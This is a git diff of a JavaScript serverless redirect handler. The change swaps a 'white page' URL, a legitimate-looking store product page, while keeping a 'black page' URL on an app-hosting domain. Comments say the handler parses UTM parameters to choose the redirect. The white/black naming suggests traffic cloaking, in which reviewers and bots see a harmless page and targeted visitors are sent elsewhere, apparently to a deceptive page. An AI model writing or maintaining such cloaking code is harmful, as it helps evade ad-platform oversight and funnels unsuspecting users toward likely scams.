@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://adapteroo.com.au/products/ugreen-145w-25000mah-usb-c-fast-charging-portable-power-bank";
+    const whitePageURL = "https://www.nishatlinenuae.com/collections/new-arrival/products/42502891";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
